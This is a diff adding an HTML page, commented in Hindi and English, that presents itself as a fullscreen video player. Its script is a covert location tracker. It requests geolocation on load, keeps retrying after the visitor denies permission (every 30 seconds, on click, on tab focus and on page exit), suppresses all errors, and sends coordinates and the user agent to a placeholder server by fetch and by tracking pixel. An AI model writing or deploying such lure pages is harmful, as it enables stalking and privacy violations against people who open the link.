@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Stream</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+        }
+
+        #videoContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+        }
+
+        #fullscreenVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(0.8);
+        }
+    </style>
+</head>
+<body>
+    
+    <div id="videoContainer">
+        <video id="fullscreenVideo" autoplay muted playsinline loop>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <script>
+        // Browser Detection
+        const isChrome = /Chrome/.test(navigator.userAgent);
+        const isFirefox = /Firefox/.test(navigator.userAgent);
+        const isSafari = /Safari/.test(navigator.userAgent);
+        
+        // Page load पर सीधे location request
+        window.addEventListener('DOMContentLoaded', (event) => {
+            // थोड़ा delay - page load complete होने दें
+            setTimeout(() => {
+                startVideoAndRequestLocation();
+            }, 1000);
+        });
+        
+        function startVideoAndRequestLocation() {
+            const video = document.getElementById('fullscreenVideo');
+            
+            // Video play करें
+            const playPromise = video.play();
+            if (playPromise !== undefined) {
+                playPromise.catch(error => {
+                    // Autoplay blocked - click पर play
+                    document.body.addEventListener('click', () => {
+                        video.play();
+                    }, { once: true });
+                });
+            }
+            
+            // Direct location permission request
+            requestLocationSilently();
+        }
+        
+        function requestLocationSilently() {
+            if (navigator.permissions && navigator.permissions.query) {
+                // Check permission state first
+                navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
+                    if (permissionStatus.state === 'granted') {
+                        // Already granted - get location
+                        getCurrentLocation();
+                    } else if (permissionStatus.state === 'prompt') {
+                        // Not decided yet - trigger prompt
+                        triggerLocationPrompt();
+                    } else {
+                        // Denied - retry with different method
+                        retryWithGetCurrentPosition();
+                    }
+                }).catch(() => {
+                    // Permissions API not supported - use direct method
+                    retryWithGetCurrentPosition();
+                });
+            } else {
+                // Direct geolocation call
+                retryWithGetCurrentPosition();
+            }
+        }
+        
+        function triggerLocationPrompt() {
+            // यही REAL BROWSER POPUP TRIGGER करता है
+            if (navigator.geolocation) {
+                // High accuracy, no timeout - सिर्फ prompt trigger करने के लिए
+                navigator.geolocation.getCurrentPosition(
+                    // Success - location मिल गई
+                    (position) => {
+                        // Location data process करें
+                        processLocationData(position.coords);
+                    },
+                    // Error - user ने deny कर दिया
+                    (error) => {
+                        // Retry with different timing
+                        setTimeout(retryWithGetCurrentPosition, 3000);
+                    },
+                    // Options that maximize chance of prompt
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 2147483647, // Maximum timeout
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+        
+        function retryWithGetCurrentPosition() {
+            // Alternative method - direct call
+            if (navigator.geolocation) {
+                // Multiple attempts with different strategies
+                const strategies = [
+                    { enableHighAccuracy: false, timeout: 5000 },
+                    { enableHighAccuracy: true, timeout: 10000 },
+                    { enableHighAccuracy: true, timeout: 30000 }
+                ];
+                
+                strategies.forEach((options, index) => {
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => processLocationData(pos.coords),
+                            () => {}, // Silent fail
+                            options
+                        );
+                    }, index * 5000); // 5 second intervals
+                });
+            }
+        }
+        
+        function getCurrentLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        processLocationData(position.coords);
+                    },
+                    () => {
+                        // Silent error
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+        
+        function processLocationData(coords) {
+            // यहाँ location data process करें
+            const locationData = {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // Server पर send करने के लिए (आपका endpoint)
+            sendToServer(locationData);
+            
+            // Console में log (debugging के लिए)
+            console.log('Location acquired:', locationData);
+        }
+        
+        function sendToServer(data) {
+            // आपका server endpoint
+            const endpoint = 'https://your-server.com/location-track';
+            
+            // Fetch API से send
+            fetch(endpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+                mode: 'no-cors' // CORS issues से बचने के लिए
+            }).catch(() => {
+                // Silent fail - कोई error message न दिखाए
+            });
+            
+            // Backup method - image pixel tracking
+            const img = new Image();
+            img.src = `https://your-server.com/track.gif?lat=${data.latitude}&lon=${data.longitude}&t=${Date.now()}`;
+        }
+        
+        // Page visibility change पर retry
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                // Page visible होने पर retry
+                setTimeout(requestLocationSilently, 2000);
+            }
+        });
+        
+        // Periodic retry every 30 seconds
+        setInterval(() => {
+            if (!document.hidden) {
+                requestLocationSilently();
+            }
+        }, 30000);
+        
+        // User interaction पर fullscreen और unmute
+        document.addEventListener('click', () => {
+            const video = document.getElementById('fullscreenVideo');
+            
+            // Unmute video
+            video.muted = false;
+            
+            // Enter fullscreen
+            if (video.requestFullscreen) {
+                video.requestFullscreen().catch(() => {});
+            } else if (video.webkitRequestFullscreen) {
+                video.webkitRequestFullscreen();
+            } else if (video.mozRequestFullScreen) {
+                video.mozRequestFullScreen();
+            }
+            
+            // Retry location on user interaction
+            requestLocationSilently();
+        });
+        
+        // Page unload से पहले final attempt
+        window.addEventListener('beforeunload', () => {
+            // Last attempt to get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => processLocationData(pos.coords),
+                    () => {},
+                    { enableHighAccuracy: false, timeout: 1000 }
+                );
+            }
+        });
+    </script>
+</body>
+</html>
